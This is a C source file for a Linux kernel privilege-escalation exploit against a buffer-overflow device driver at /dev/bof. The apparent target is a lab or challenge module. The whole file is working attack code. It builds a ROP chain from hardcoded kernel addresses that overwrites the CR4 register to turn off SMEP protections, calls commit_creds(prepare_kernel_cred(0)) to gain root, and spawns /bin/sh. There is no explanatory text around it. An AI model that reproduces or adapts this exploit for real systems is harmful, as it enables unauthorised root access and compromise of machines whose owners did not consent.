#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<fcntl.h>
#include<pthread.h>
#include<sys/stat.h>

#define DEVICE_FILE "/dev/bof"
#define NATIVE_WRITE_CR4 0xc1045050u
#define POPEAX 0xc10174fcu
#define POPECX 0xc125f6cbu
#define POPEDX 0xc10d51eau
#define SYSEXIT 0xc18de916u
#define DESIRED_CR4_VALUE 0x6d0u

typedef unsigned int __attribute__((regparm(3)))(*commit_creds_func)(unsigned int cred);
typedef unsigned int __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned int cred);
commit_creds_func commit_creds = (commit_creds_func) 0xc1070e80;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xc10711f0;

int fd;
unsigned int filler=0x41414141;
char *args[]={"/bin/sh",NULL}; 
unsigned int fakestack=0x174000;

void privesc(){
	commit_creds(prepare_kernel_cred(0));
}
void get_shell(){
	puts("[+] CR4 register overwritten!");
	if(!getuid()){
		puts("[+] Priv esc achieved!");
		puts("[+] Here is your root shell!");
		execve("/bin/sh",args,NULL);
	}
	else{
		puts("[-] Priv esc failed!");	
		exit(EXIT_FAILURE);
	}
}

void exploit(){
	mmap((void *)fakestack,0x6000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);
	memset((void *)fakestack,0,0x6000);
	unsigned int ropchain[]={filler,filler,filler,filler,filler,filler,filler,filler,filler,filler,
				POPEAX,DESIRED_CR4_VALUE,NATIVE_WRITE_CR4,
				privesc,
				POPECX,fakestack+0x2000,
				POPEDX,get_shell,
				SYSEXIT};
	write(fd,(char *)ropchain,sizeof(ropchain));
}

int main(){
	fd=open(DEVICE_FILE,O_RDWR);
	exploit();
	close(fd);
}


